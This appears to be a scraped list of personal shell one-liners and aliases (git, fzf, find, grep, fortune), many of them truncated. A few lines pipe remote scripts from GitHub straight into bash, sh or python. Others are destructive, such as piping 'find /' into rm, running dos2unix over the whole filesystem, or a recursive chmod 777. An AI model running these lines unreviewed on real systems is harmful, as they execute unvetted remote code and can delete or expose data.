g diff --name-only | xargs sub
g diff --color | more
g dh1|gdiff
g co $(g tag | fzf)
g co $(g branch -a | fzf)
g checkout `g rev-list master | tail -1`
g checkout `g rev-list --topo-order HEAD..master | tail -1`
g branch -a|grep
g branch -av | awk
g branch -D `g branch --list | fzf`
g branch --merged | grep -v master > /tmp/merged-branches && vim /tmp/merged-branches && xargs git branch -d < /tmp/merged-branches
g bl | sed -e '/^[^*]/d' -e 's/* \(.*\)/ \1/'
g add . | lolcat
g -l --python . | ctags -L - -f tags
fzft|open_in_app
fzf_vim $(fasd -flr -b viminfo | fzf)
fzf | yy
fzf | xclip -i
fzf | xargs vim
fzf | xargs rsub -f
fzf | xargs rsub
fzf | xargs rm -v
fzf | xargs open
fzf | xargs nvim
fzf | xargs gvim
fzf | xargs -r nvim
fzf | xargs -r code
fzf | xargs -r $EDITOR;
fzf | xargs -r $EDITOR
fzf | xargs -o code
fzf | xargs $EDITOR
fzf | pbcopy
fzf | m
fzf | ls
fzf -m | xargs $EDITOR
fzf --print0 | xclip -select c
fzf --print0 | pbcopy
fzf --preview-window=top --preview='head -100 | bat --theme=zenburn --color=always --map-syntax js:babel {}'
fzf --preview 'bat --style=numbers --color=always {} | head -500'
fzf --preview 'bat --color always {}' | xargs -i '{}' xdg-open '{}'
fzf --multi | xargs mvim -p --
fzf --height 40% --preview 'if file -i {}|grep -q binary; then file -b {}; else bat --color \
fzf --height 100% --preview 'if file -i {}|grep -q binary; then file -b {}; else bat --color \
funny_quotes | cowsay
functions | sed -n 's/\(.*\)\ ().*{$/\1/p'
functions | less
functions | ack
function(){echo $1 | base64}
function(){echo $1 | base64 -D}
function() { curl $1 | pp.js }
function urlencode_(){ echo ${1}|~/scripts/urlencode.py;};urlencode_
function urldecode_(){ echo ${1}|~/scripts/urldecode.py;};urldecode_
function func { grep --color=always $* | less -R; }; func
function echn_(){ echo -n ${1}|base64;};echn_
function _youtubeTxt(){ cat $1 | while read line ; do youtube-dl -x --audio-format=mp3 --audio-quality=0 $line ; done; }; _youtubeTxt
function _vimlr(){ vim `ls -tr $1 | tail -1`; };_vimlr
function _video2gif() {ffmpeg -i $1 -pix_fmt rgb24 -f gif - | gifsicle > $2;}; _video2gif
function _pwc(){ pdftotext $1 - | wc -w; };_pwc
function _pjson(){ python -m json.tool $1 | pygmentize -l json; }; _pjson
function _p(){ ps aux | grep -ni $1; };_p
function _p(){ history | grep -ni $1; };_p
function _net(){ netstat -apn | grep -ni $1; };_net
function _mtr(){ mtr $@ | nali; }; _mtr
function _ls() { ls -l $0| awk
function _iphone(){curl https://raw.githubusercontent.com/omerh/scripts/master/make-iphone-ringtone.sh | bash -s $1};_iphone
function _hs(){ history | grep $1; };_hs
function _histof(){ history | grep $1 }; _histof
function _gtail () { tail -n 300 -f \$2 | gr -i --line-buffered \$1 ; } ; _gtail
function _gs() {git grep -ni $1 | fpp};_gs
function _findport(){ lsof -n -i4TCP:$@ | grep LISTEN};_findport
function _er(){ mkdir $3; find $LOCAL_RESULT_DIR/$1 -regex .*/.*$2.* -type f -print0 | xargs -0 cp -t $3; }; _er
function _encryptCompress(){ tar -czf - $1 | openssl enc -aes-256-cbc -e > $2 ; }; _encryptCompress
function _duh(){sudo du -xh -d1 $1 | sort -rh};_duh
function _domanvim() { man $1 | vim -R -; }; _domanvim
function _decryptCompress(){ openssl enc -aes-256-cbc -d -in $1 | tar xz ; }; _decryptCompress
function _cpclip(){ cat $1 | pbcopy; };_cpclip
function _catslow(){ cat $1 | pv -qL 5000; };_catslow
function __repsed(){ find ./ -type f | xargs sed -i 's/\$1/\$2/g'; };__repsed
function __lm() { ls -Al --color=always $* |more; }; __lm
function __json() { jq -C . $* | less -R; unset -f __json; }; __json
function __cg() { log-credhub ; credhub get -n $1 -j | jq .value -r; }; __cg
function _(){ docker images | grep \
func() {ps -ef | grep $1;}; func
func() { sudo lsof -nP -iTCP -sTCP:LISTEN | grep $1;}; func
func() { if $(echo '[ ! -z $1 ]'); then; message=$(echo '$@'); else; message='Changed files: '$(echo '$(git status --porcelain | grep -v
func() { find . -name $(echo '$@') -type f -not -path '*.git*' | fzf -m; }; func
fun () { find . -type f -name $1 | xargs rm -rv {} ;};fun
full|percentage"""
ftxinstalledfonts -u | sort -k2
ftxinstalledfonts -p | sort -k2
ftx . .. err.txt generated.file succ.txt | more
ftp -Vo - https://raw.github.com/sizowie/dotfiles/master/get.sh | sh -x -
fswatch lib/ test/ | mix test --listen-on-stdin
fswatch -r . | xargs -L1 $*
fswatch -o ~/src/rplabs/ | xargs -n1 -I{} rsync -atvz0 --exclude data_science_dev/ --exclude .git* --del ~/src/rplabs/ ${UTIL}:/home/ubuntu/jbadger/code
fswatch -o ~/Downloads | xargs -n1 -I{} sort
fswatch -o ./test ./lib | xargs -n1 -I{} ~/.etest.sh
fswatch -o ./lib | xargs -n1 -I{} ~/.credo_run.sh
fswatch -o ./ | xargs -n1 -I{} sh -c 'clear; printf \
fswatch -o ./ | xargs -n 1 -I{} doctest -isrc -Wall -fno-warn-type-defaults
fswatch -o . | xargs -n1 -I{} $1
fswatch -o . | xargs -n1 -I{}
fswatch -o -0 . | xargs -0 -n 1 -I {} go test
fswatch -e target . | xargs -n1 ~/etsync.sh
fswatch -0 / | xargs -0 -n 1 /bin/echo d:
fswatch -0 -o . | xargs -n1 -I {}
fstat | grep -i
fs | xargs grep $@
from | tail -n +2
frm -n -S | tail -r -n 10
freshclam --quiet; clamscan -r -i ~/Downloads | grep Infected
free | awk 'FNR == 3 {print $4/($3+$4)*100}'
free | awk 'FNR == 3 {print $3/($3+$4)*100}'
free | awk
free -mt; sync && echo -n 3 | sudo tee /proc/sys/vm/drop_caches; free -mt
free -mot; sync && echo -n 3 | sudo tee /proc/sys/vm/drop_caches; free -mot
free -mh && sync && echo 3 | sudo tee /proc/sys/vm/drop_caches && sudo swapoff -a && sudo swapon -a && free -mh
free -m; sudo sysctl -w vm.drop_caches=3 && sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches; free -m'
free -m | sed 's/ \+/ /g'
free -m | awk 'NR==3 {print \$4 \
free -m | awk 'NR==2{printf \
free -m | awk '/^Swap/{print 100*\$3/\$2}'
free -m | awk '/^Mem/{print 100*\$3/\$2}'
free -m | awk '/-\/\+\ buffers\/cache:/ {print \$4}\'
free -h|cut -b -43
free -h | grep -i mem
free -h | awk '/^Mem:/ {print \
free -h | awk
free -h && sync && echo 3 | sudo tee /proc/sys/vm/drop_caches && free -h
free -g | awk '/Mem:/{print $2}'
free --human --wide | sed -e '/^Swap/d'
fpp --help | less
fping -dagA 192.168.1.1/27 -r 0 | awk
fp | pbcopy
fortune|ponysay
fortune|cowsay
fortune-zh | cowthink
fortune ~/text/fortunes/ | fold -sw 60
fortune |cowsay
fortune | xcowsay -f dragon
fortune | tr stpfkSTPFKhHqQ zdbvgZDBVG''kK
fortune | toilet --metal -f term
fortune | tee .fortune.tmp
fortune | randomcowsay
fortune | ponysay -f owl
fortune | ponysay -b unicode -W $COLUMNS
fortune | ponysay
fortune | parrotsay
fortune | lolcat
fortune | cowthink -n
fortune | cowthink -f bud-frogs
fortune | cowthink
fortune | cowsay -n -f ${cow_images[cow_random]}
fortune | cowsay -n -W 80
fortune | cowsay -n
fortune | cowsay -f tux
fortune | cowsay -f stegosaurus
fortune | cowsay -f ghostbusters
fortune | cowsay -f dragon
fortune | cowsay -f $(shuf -n -e ~/.cows/*)
fortune | cowsay -f $(random_cow)
fortune | cowsay -W 60
fortune | cowsay -W $[$(tput cols)-3]
fortune | cowsay && echo ' '
fortune | cowsay
fortune | cow
fortune void | cow
fortune limericks | cowsay
fortune futurama | cowsay -f bender
fortune de | cow
fortune citations_fuckoff | cowsay -f turkey
fortune chuck | cowsay
fortune calvin | cowsay
fortune H2G2 | cowsay
fortune /usr/share/games/fortunes/off/limerick | cowsay -n
fortune -sa|cowsay -W68
fortune -s | say
fortune -s | cowsay -f /usr/share/cows/tux.cow
fortune -s | cowsay && say moo
fortune -s | cowsay
fortune -s fortunes | cowsay
fortune -o | cowsay
fortune -e | cowthink -n
fortune -a | cowthink -f $(shuf -n 1 -e $(find /usr/share/cows))
fortune -a | cowsay -n
fortune -a -e | cowsay -f tux
foreman | lolcat
foreman start --env ~/.env| grep web.1
for x in \$(cat package.json | grep \\\
for x in SSH_CLIENT SSH_TTY SSH_AUTH_SOCK SSH_CONNECTION ; do (eval \$x=\\$\$x) | sed -e 's/=/=\
for x in SSH_CLIENT SSH_TTY SSH_AUTH_SOCK SSH_CONNECTION ; do (echo eval \$x=\\$\$x) | sed -e 's/=/=\
for x in $(docker images | awk
for wtmp in `dir -t /var/log/wtmp*`; do last reboot -f $wtmp; done | less
for t in files links directories; do echo `find . -type ${t:0:1} | wc -l` $t; done 2> /dev/null
for t in files links directories; do echo \`find . -type \${t:0:1} | wc -l\` \$t; done 2> /dev/null
for t in files links directories; do echo $(find . -type \${t:0:1}) | wc -l \$t; done 2> /dev/null
for t in files likns directories; do echo \`find . -type \$(t:0:1) | wc -l\`$t; done 2> /dev/null
for snapshot in $(stellar list | sed
for shit in `git branch | grep -v master`; do git branch -d $shit; done
for remote in `git branch -r | grep -v master$ `; do git checkout --track $remote ; done
for remote in `git branch -r | grep -v master `; do git checkout --track $remote ; done
for remote in `git branch -r | grep -v \>`; do git branch --track ${remote#origin/} $remote; done && git fetch --all
for remote in `git branch -r | grep -v /HEAD`; do git checkout --track $remote ; done
for remote in $(git remote | xargs); do git fetch $remote --prune; done
for remote in $(git branch -r | grep -v master); do git checkout --track $remote; done; git checkout master
for pid in $(ps | grep
for package in $(pip list --outdated --format freeze | cut -d= -f1); do pip install --upgrade --user $package; done
for package in $(npm -g outdated --parseable --depth=0 | cut -d: -f2); do IFS=
for module in `ls node_modules | grep sp-`; do yarn link $module; done
for module in `ls node_modules | grep sl-`; do yarn link $module; done
for module in `ls node_modules | grep oo-`; do yarn link $module; done
for k in `git branch | perl -pe
for k in `git branch -r | perl -pe 's/^..(.*?)( ->.*)?$/\1/'`; do echo -e `git show --pretty=format:
for k in `git branch -r | perl -pe
for k in `git branch -a | perl -pe
for k in $(git branch -r | perl -pe
for img in `sudo tmutil listlocalsnapshotdates | egrep
for image in $(docker images | awk
for i in {1..2}; do cat /sys/devices/platform/applesmc.768/fan${i}_min | sudo tee /sys/devices/platform/applesmc.768/fan${i}_output; done
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep 'from'; done
for i in {1..254}; do ping -c 1 -W 1 10.1.1.$i | grep
for i in xml html; do find . -name \*.$i; done | xargs grep --color -Hn
for i in txt; do find . -name \*.$i;done |xargs grep --color -Hn
for i in spec;do find . -name \*.$i;done |xargs grep --color -Hn
for i in sh py;do find . -name \*.$i;done |xargs grep --color -Hn
for i in py; do find . -name \*.$i; done | xargs grep --color -Hn
for i in log; do find . -name \*.$i;done |xargs grep --color -Hn
for i in js conf txt c h cpp py xml log cfg spec conf.spec conf.example conf.spec.in conf.example.in; do find . -name \*.$i; done | xargs grep --color -Hn
for i in in; do find . -name \*.$i;done |xargs grep --color -Hn
for i in h; do find . -name \*.$i; done | xargs grep --color -Hn
for i in cpp; do find . -name \*.$i; done | xargs grep --color -Hn
for i in cpp h c; do find . -name \*.$i; done | xargs grep --color -Hn
for i in cpp c; do find . -name \*.$i; done | xargs grep --color -Hn
for i in conf; do find . -name \*.$i; done | xargs grep --color -Hn
for i in conf html swf xml js css; do find . -name \*.$i; done | xargs grep --color -Hn
for i in conf cfg; do find . -name \*.$i; done | xargs grep --color -Hn
for i in cfg;do find . -name \*.$i;done |xargs grep --color -Hn
for i in b c d e f;do _usbmount /usb$i;done;mount | grep usb
for i in a b c d e f;do _usbumount /usb$i;done;mount | grep usb
for i in `seq 1 30`; do getIp ; done | sort -u
for i in `say -v \? | awk {'print $1'}` ; do say done -v $i ; done
for i in `ls /etc/init.d/` ; do service $i status ; done | grep --color=auto running
for i in `find ~/repos -maxdepth 3 -name .git | grep -v forge` ; do cd $i/../ ; pwd ; git status ; echo ; done
for i in `find . -name CMakeLists.txt`; do echo $i; done | xargs grep --color -Hn
for i in `atq | cut -f1` ; do atrm $i; done
for i in \$(tmux list-windows | awk -v x=\$(tmux display-message -p '#I') -F ':' '\$1 > x {print \$1}'); do tmux kill-window -t \$i ; done
for i in G M K; do du -sh */ | grep [0-9]$i$
for i in /mnt/usb*/*; do /bin/busybox2 umount $i 2>&1 | grep -v 'Invalid argument'; done
for i in *; do rsvg-convert $i -o `echo $i | sed -e
for i in *; do n=`echo $i | sed 's/(//g;s/)//;s/ 1080p x265 Joy.*\././g'`; echo $n ; done
for i in *; do mv $i `echo $i | tr [:upper:] [:lower:]`; done
for i in *; do inkscape $i -d=300 -C --export-png=`echo $i | sed -e s/svg$/png/`; done
for i in *; do inkscape $i --export-png=`echo $i | sed -e
for i in *; do inkscape $i --export-plain-svg=`echo $i | sed -e s/eps$/svg/`; done
for i in *20*; do n=`echo $i|sed 's/%20/\ /g'`; mv $i $n; done
for i in *.txt*; do new_name=`echo $i | sed -r 's/(.*)\.txt(.*)/\1\2.log/g'`; mv $i $new_name; done
for i in *.flac; do ffprobe $i 2>&1 | grep -i composer; done
for i in *.flac; do ffprobe $i 2>&1 | grep -i artist; done
for i in *.aif; do name=`echo $i | cut -d'.' -f1`; echo $name; ffmpeg -i $i -q:a 0 $name.mp3; done
for i in *.NEF; do dirname=`ll --time-style=full-iso $i | awk
for i in err.txt generated.file succ.txt ; do j=`echo $i | sed
for i in err.txt generated.file succ.txt ; do j=$(echo '$i' | tr '[:upper:]' '[:lower:]') ; mv '$i' '$j' ; done
for i in 'ls schmod*.so'; do strings -f $i | grep Platform ; done
for i in $(tree -if | grep .rar);do unrar x $i; done;
for i in $(qst | cut -c1-7); do jobids=(${jobids[@]} $i); done; export jobids; echo ${jobids[@]}
for i in $(pip3 list --outdate |awk 'NR>2{print $1}');do pip3 install --upgrade $i;done
for i in $(lsrepos); do if [ ! -e ${i}out/target/product/ ]; then continue; fi; for j in $(ls ${i}out/target/product/ | grep -v generic); do echo ${i}out/target/product/$j; done; done
for i in $(gst -s | grep -P
for i in $(atq | cut -f 1); do atrm $i; done
for i in $(/usr/bin/seq -w 0 40); do echo $i ; find . -name \*-\*-${i}.jpg | wc; done
for i in $( git tag | grep phabricator ); do git tag -d $i; done
for h in `sudo lastb | awk
for h in `sudo iptables -S f2b-sshd | awk
for h in `find-exo-hosts store-store|ack -v pp`; do echo $h; ssh root@$h /root/toolbox/cassandra-restart.sh; done
for file in *; do mv $file $(echo $file | tr [[:upper:]] [[:lower:]]); done
for file in *.pages ; do mv $file `echo $file | sed
for file in *.html ; do mv $file `echo $file | sed
for file in $(find . | grep .DS_Store); do rm -i $file; done
for fil in `find | grep mympirun`; do ls -alrt $fil; done
for fil in `find | grep grmhdoutput.txt`; do echo $fil; tail -5 $fil; done
for f in `ls`; do echo $f: `ls $f | wc -l`; done
for f in `gs | grep
for f in `git diff --name-only|grep pm$`; do echo; echo $f; perl -cIlib $f; done
for f in *; do mv -f $f $(echo $f | tr A-Z a-z ) ; done
for f in *.m4a;do if ! [ -f ${f%.m4a}.mp3 ]; then rate=`mediainfo $f| awk
for f in *.aac;do if ! [ -f ${f%.aac}.mp3 ]; then rate=`mediainfo $f| awk
for dir in `ls /mnt/ ` ; do echo -n /mnt/$dir:; cd /mnt/$dir; find . -maxdepth 1 -type d | wc -l;done
for dir in *; do du -sk $dir; done | sort -n
for branch in origin/master; do echo -e 2018-08-09 14:47:01 +0200 25 minutes ago Benjamin Roth ; done | sort -r
for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --format=
for branch in `git branch -r --no-merged | grep -v HEAD`; do echo -e `git show --format=
for branch in `git branch -r --merged | grep -v HEAD`; do echo -e `git show --format=
for b in `git branch --merged | grep -v \*`; do git branch -D $b; done
for b in `git branch --merged | grep -v \*`; do echo $b; done
for a in `gpg2 -k | sed -rn 's/pub +[a-z0-9]+\/(0x[0-9A-Fa-f]+).*/\1/p'`; do gpg2 --quiet --no-tty --edit-key $a clean save; done;
for VM in `VBoxManage list runningvms | awk '{ print $2; }'`; do VBoxManage controlvm $VM poweroff; done
for FILENAME in cps*.war; do NEW=$(echo $FILENAME | cut -c4-); mv $FILENAME qa#cpsqang$NEW; done
for FILENAME in cps*.war; do NEW=$(echo $FILENAME | cut -c4-); mv $FILENAME qa#cpsqaga$NEW; done
for DRCT in `ls --width=1 | grep /`; do du -s $DRCT; done;
for CONTAINER_ID in $(docker ps | awk
for B in $(git branch -a | awk
footprint -P | pbcopy
fo;pserve $BB_CONFIG_DIR/config.ini --reload 2>&1 | colortail -k scripts/colortail.conf /dev/stdin
fly -t $CONCOURSE_TARGET containers | grep $PIPELINE_NAME
flow --color=always | more -r
flow --color always | less -r
flog | grep
flist|fgrep \!:1
fleetctl list-units | grep
fleetctl list-machines |awk
flay -v --diff . | less
flatpak run $(flatpak list | awk -F$
fixssh ; tmux save-buffer - | pbcopy
firstint | listkill
firewall-cmd --list-all-zones | less
firejail curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python -
finger @localhost | grep UpTime
finger 7012@graph.no | grep -v NRK
find|grep -i
find|grep $1
findswp; find . -name '*.swp' | xargs rm
findsrc -print0 | fzfxargs
findpy | xargs grep
findmine | grep -iE .orig$
findlurkers | zsh
findignore `projectroot` | fzf
findgit | xargs -P10 -I{} git -C '{}' pull origin master:master
findgit | xargs -P10 -I{} bash -c \
findgit | xargs -I{} bash -c 'br \
finddot -print0 | xargs -0 rm
findcpp | xargs grep
findcpp | xargs clang-format -style=file -i
findconsolelogs | xargs gvim
findcode | xargs grep
findapk | xargs adb-gone.sh
find ~/music -name *.mp3 | wc -l
find ~/logs -type f -print0 | xargs -0 egrep -niH --color
find ~/dev/repos/dev/core-webapp/src/main/webapp/resources/ -name package-lock.json -maxdepth 2 | xargs rm
find ~/dev/repos/dev/core-webapp/src/main/webapp/resources/ -name node_modules -maxdepth 2 -type dir | xargs rm -rf
find ~/code/ type f -print | grep
find ~/bin -type f | xargs chmod +x
find ~/Programmes -name .tool-versions -exec cat {} \; | sort -u
find ~/Music -print0 | xargs -P 0 -0 nice -n 19 mp3val -f
find ~/Library/Developer/CoreSimulator/Devices/$(ls -t1 ~/Library/Developer/CoreSimulator/Devices/ | head -1)/data/Containers/Data/Application/ -name \*.realm
find ~/Library/Application\ Support/Developer/Shared/Xcode/Plug-ins -name Info.plist -maxdepth 3 | xargs -I{} defaults write {} DVTPlugInCompatibilityUUIDs -array-add `defaults read /Applications/Xcode.app/Contents/Info.plist DVTPlugInCompatibilityUUID`;
find ~/Library/Application\ Support/Developer/Shared/Xcode/Plug-ins -name Info.plist -maxdepth 3 | xargs -I{} defaults write {} DVTPlugInCompatibilityUUIDs -array-add `defaults read /Applications/Xcode.app/Contents/Info.plist DVTPlugInCompatibilityUUID`
find ~/Library/Application\ Support/Developer/Shared/Xcode/Plug-ins -name Info.plist -maxdepth 3 | xargs -I{} defaults write {} DVTPlugInCompatibilityUUIDs -array-add `defaults read /Applications/Xcode.app/Contents/Info DVTPlugInCompatibilityUUID`
find ~/Library/Application\ Support/Developer/Shared/Xcode/Plug-ins -name Info.plist -maxdepth 3 | xargs -I{} defaults write {} DVTPlugInCompatibilityUUIDs -array-add `defaults read /Applications/Xcode-beta.app/Contents/Info DVTPlugInCompatibilityUUID`
find ~/Documents/SWITCH/Sitzungsnotizen | xargs grep TODO
find ~/.zsh_history -type f -print | xargs grep
find ~/.virtualenvs -maxdepth 1 -mindepth 1 -type d -printf '%f\\n'|sort
find ~/.vim/swap_files -type f | xargs rm -f
find ~/.ssh/conf.d -type f -name '*.conf' -print0 | xargs -0 -I file cat file > ~/.ssh/config
find ~/.purple/logs/ -type f -mtime -5 | xargs tail -n 5
find ~/.m2/repository -name \*SNAPSHOT -type d -print0 | xargs -0 rm -rf
find ~/.m2 -name \*SNAPSHOT -type d -print0 | xargs -0 rm -rf
find ~/.local/share/nvim/swap/ -name '*sw[m-p]' | xargs rm
find ~/.history/ -type f -print0 2>/dev/null | xargs -0 grep --color=auto -InH
find ~/.config/nvim/swap-files -type f | xargs rm -f
find ~/.* -maxdepth 0 | less
find ~/ -name '.DS_Store' | sed 's/.*/\
find ~/ -name '*~' -print0 | xargs -0 rm
find ~ | grep
find ~ -type f | fzy
find ~ -type f -exec cat '{}' \; | play -r 44100 -b 16 -c 1 -e signed-integer -t raw - lowpass 4k flanger 0 7 reverb 100
find ~ -type d -name .git | xargs -n 1 dirname
find ~ -type d -name .git 2> /dev/null | grep --color=never -oP \
find |grep -i
find |grep
find | wc -l
find | v-
find | grep -i --color=auto
find | grep -i
find | grep -P
find | grep -Fi
find | grep --color=auto
find | grep $1
find | grep
find | egrep -i
find | egrep
find | ack-grep -i -r
find {{@@ env['hman_git_folder'] @@}}/cpython -type f -name '*.c' -o -name '*.h' | xargs grep
find var/cache/ -type f -name '*CRON*' -print0 | xargs -0 rm
find tizen-studio-data | grep p12
find test/ -name '*_test.rb' | xargs -n1 -I{} bundle exec ruby -Itest {}
find src | grep
find src -type f | xargs git update-index --chmod=-x
find src -name \*.h -or -name \*.hpp -or -name \*.cpp | xargs etags
find src -name IntegrationTests | while read dir; do s2t $dir; done
find resources/sql -type f -iname \*\.js -mtime -5d -ls -or -iname \*\.sql -mtime -5d -ls |grep -vi \.svn
find public/stylesheets -name \*.css | xargs grep -s
find public -name prod-*|xargs rm
find obj-firefox-release -regex .*/dist/[^/]*\.app | sed -e
find obj-firefox-debug -regex .*/dist/[^/]*\.app | sed -e
find node_modules -maxdepth 3 -type l | egrep '^node_modules/[^\.]'
find node_modules -maxdepth 2 -type l | cut -d'/' -f 2
find node_modules -maxdepth 1 -type l | cut -d'/' -f 2
find media/TV\ Series/ -maxdepth 2 -mindepth 2 -type d | sed -e
find lib -name '*.*' | xargs wc -l
find db/migrate/ -type f | tail -1
find application/cache/ -type f -not -name '*html' -not -name '*htaccess' -print0 | xargs -0 rm --
find app/assets/javascripts/ -type f -exec sed -E -n -e 's/.*alert\(.*\(([0-9][0-9]?)\).*/\1/p' {} \; | sort -n
find `pwd`| grep
find `pwd` \( -name .git -prune \) -o -print0 2>/dev/null | xargs -0 egrep
find `pwd` \( -name .git -prune \) -o -print 2>/dev/null | egrep
find `pwd` -type f | grep checksum > /tmp/files && while read line; do mv -f $line $PWD/checksum; done < /tmp/files
find `pwd` -maxdepth 1 | sort
find `pwd` -maxdepth 1 -type f | sort
find `pwd` -maxdepth 1 -type d | sort
find `pwd` -maxdepth 1 -mindepth 1 | grep
find `ls -A` -maxdepth 0 -type f | xargs
find `ls -A` -maxdepth 0 -type d | xargs
find `ls -1trd */ | tail -1` -name Log.xml -exec less {} \;
find \( -name mimis -or -name jquery -or -name eson -or -name rhino -or -name js \) -print0 | xargs -0
find \( -name jpg -or -name png -or -name gif -or -name odp -or -name mpeg -or -name avi -or -name webm -or -name ttf \) -print0 | xargs -0 lnhash
find \( -name '*.php' -o -name '*.strap' -o -name '*.js' \) | xargs wc -l
find \( -name '*.c' -o -name '*.h' \) | xargs wc -l
find PATH -type d | wc -l
find 2>/dev/null | grep
find 2> >(grep -v 'Permission denied' >&2) | grep
find /var/www/ -name storage | sudo xargs chmod -R 777;
find /var/log -type f -name 'syslog' | xargs grep -aH --color=\$COLOR_FLAG
find /var/log -type f -exec grep -I1 . {} \; | pv -q -L 1k
find /var/abs | grep
find /usr/share/zoneinfo/ | cut -d/ -f5-
find /opt/sybase/dumps -mtime -2 -exec ls -l {} \; | sort
find /opt/sybase/dumps -mtime +2 -exec ls -l {} \; | sort
find /media/others/陈奕迅无损/ | shuf > /tmp/mp3.lst;mpv --playlist=/tmp/mp3.lst
find /home/y/var/ycb/cache/ -name *.mdbm -or -name *.ysc -or -name *.lock |xargs -r -n 1 sudo rm;sudo rm /home/y/tmp/apc_user_cache.mdbm;sudo rm  /home/y/var/yrb/cache/.*;sudo rm  /home/y/var/run/yrb/cache/.*;sudo rm -rf /home/y/var/ycb/cache/*/.*;sudo rm -rf /home/y/var/run/ycb/cache/*/.*;sudo /home/y/bin64/ycbDbAdmin -c CLEANUP
find /home/wolfson/mp3/new -mindepth 2 -maxdepth 2 -not -empty -type d | wc -l
find /home/training/pm -name *.pm | xargs grep
find /home/training/conf -name *.conf | xargs grep
find /home/stk/Documents/Blog/source/_posts/ -type d -empty | xargs -n1 rmdir
find /home/enicolas -name '*.log' -exec sh -c 'echo; echo {}; grep Predicted -B5 {} | tail -6' \;
find /global/software/sl-7.x86_64/modfiles -type d -exec ls -d {} \; | grep
find /git -name '.git' -type d 2>&1 | grep -v 'Permission denied'
find /etc/systemd/system -mindepth 1 -type d | xargs ls -l --color
find /etc/rc0.d /etc/rc1.d /etc/rc2.d /etc/rc3.d /etc/rc4.d /etc/rc5.d /etc/rc6.d /etc/rcS.d | grep
find /etc/ -iname *.service | grep vnc
find /data/www -type f \( -name '*.asp' -o -name '*.js' -o -name '*.css*' -o -name '*.inc' -o -name '*.html' -o -name '*.pm' -o -name '*.pl' -o -name '*.conf' -not -name '*.svn*' \) | xargs grep
find /cygdrive/c/Dev/Dev.PP -type f | sed -r
find /cygdrive/c/Dev/Dev.PP -type f | grep -i
find /Volumes -maxdepth 1 -not -user root -print0 | xargs -0 umount
find /Volumes -maxdepth 1 -not -user root -print0 | xargs -0 diskutil eject
find /Users/davidgreen/Files/til -type f -print0 | xargs -0 grep -li
find /Applications -path '*Contents/_MASReceipt/receipt' -maxdepth 4 -print |\sed 's#.app/Contents/_MASReceipt/receipt#.app#g; s#/Applications/##'
find /3/00000000/songs/|grep -i
find // -type f -print0 | xargs -0 dos2unix
find / | grep
find / 2>/dev/null | grep -i $1
find / 2>/dev/null | grep
find / 2>/dev/null | fgrep
find / 2>&1 ! -readable -prune | grep $1
find / 2> /dev/null | grep
find / -type f -size +10000k -exec ls -lh {} \; | awk '\''{ print '\
find / -exec strings {} \; | pv -q -L 2k
find / '*.pyc' '*.swp' | xargs rm
find / $1 | grep $1
find .|xargs grep -ri
find .|xargs grep --color -ri -n
find .|sort
find .|grep -i
find .|grep
find .|ag $1
find .| grep -srie
find .| grep -i --color
find .| grep -i
find .the/refs/remotes/upstream/ -type f -print | wc -l
find .purple/logs/jabber/*/*/*.html -mtime -1 | xargs ls -l
find .git/objects -type f | xargs ls -ltr
find .[^.]* err.txt generated.file succ.txt -maxdepth 0 -type d -exec du -sk \{} + | sort -n
find ./|xargs grep
find ./|grep
find ./debian -type d | xargs chmod 755 && dpkg-deb -b debian && lintian debian.deb
find ./core -name 'Switchable*.php' | grep 'Switchable'
find ./core -name 'Storable*.php' | grep 'Storable'
find ./core -name 'Identifiable*.php' | grep 'Identifiable'
find ./core -name 'Exportable*.php' | grep 'Exportable'
find ./core -name 'Classifiable*.php' | grep 'Classifiable'
find ./\$1/ -type f | wc -l
find ./Tests -name 'Switchable*.php' | grep 'Switchable'
find ./Tests -name 'Storable*.php' | grep 'Storable'
find ./Tests -name 'Identifiable*.php' | grep 'Identifiable'
find ./Tests -name 'Exportable*.php' | grep 'Exportable'
find ./Tests -name 'Classifiable*.php' | grep 'Classifiable'
find .//. ! -name .png -print | grep -c //
find .//. ! -name . -print | grep -c //
find ./**/*.orig | xargs rm
find ./err.txt ./generated.file ./succ.txt -maxdepth 0 -type d | xargs -I{} zip -r {}.zip {}
find ./err.txt ./generated.file ./succ.txt -maxdepth 0 -type d | wc -l
find ./err.txt ./generated.file ./succ.txt -maxdepth 0 -type d | sudo xargs rm -rf
find ./err.txt ./generated.file ./succ.txt -maxdepth 0 -name \*.zip | xargs rm -rf
find ./err.txt ./generated.file ./succ.txt -maxdepth 0 -name \*.zip | xargs -I{} unzip {} -d .
find ./err.txt ./generated.file ./succ.txt -ctime -1 | xargs ls -ltr $COLORFLAG
find ./err.txt ./generated.file ./succ.txt -ctime -1 | xargs ls -ltr
find ./ | xargs grep -n --color=always
find ./ | xargs grep -h \
find ./ | xargs grep -a -i --color=auto -n3 -s $1
find ./ | xargs grep
find ./ | grep -i --colour
find ./ | grep -i
find ./ | grep --color=auto
find ./ | grep
find ./ \( -type f \) -and ! \( -name '*vendor*' \) -and ! \( -name '*svn*' \) -and ! \( -name '*tmp' \) -print | xargs grep
find ./ \( -type d -wholename '*/src/*.egg-info' -or -name dist -or -name build -or -wholename '*/docs/_build' \) | xargs rm -rf; py.clean
find ./ \( -type d -name .venv -or -name .tox \) | xargs rm -rf; py.distclean
find ./ \( -type d -and -name __pycache__ -or -name '.pytest_cache' \) -or \( -type f -name '*.pyc' \) | xargs rm -rf
find ./ -type l -print0 | xargs -0 ls -plah
find ./ -type f | xargs wc -l
find ./ -type f | xargs grep
find ./ -type f | wc -l
find ./ -type f | grep
find ./ -type f \( -name '*.aux' -o -name '*.bbl' -o -name '*.bcf' -o -name '*.blg' -o -name '*.fdb_latexmk' -o -name '*.fls' -o -name '*.log' -o -name '*.out' -o -name '*.xml' -o -name '*.gz' -o -name '*.xdv' \) | xargs -I{} rm -f {} && latexmk -c
find ./ -type f -print0|xargs -0 grep
find ./ -type f -print0 | xargs -0 md5sum
find ./ -type f -print0 | xargs -0 grep -n $1
find ./ -type f -print0 | xargs -0 grep -l
find ./ -type f -print0 | xargs -0 dos2unix --
find ./ -type f -print | xargs grep -nir
find ./ -type f -print | xargs grep -n --color TODO
find ./ -type f -print | xargs grep -n --color
find ./ -type f -print | xargs grep -n
find ./ -type f -print | xargs grep --color
find ./ -type f -print | xargs grep $1
find ./ -type f -print | xargs grep
find ./ -type f -not -name '*spec.rb' | xargs grep
find ./ -type f -iname '*.php' -print0 | xargs -0 grep -inr
find ./ -type f -exec file -i {} \; | grep
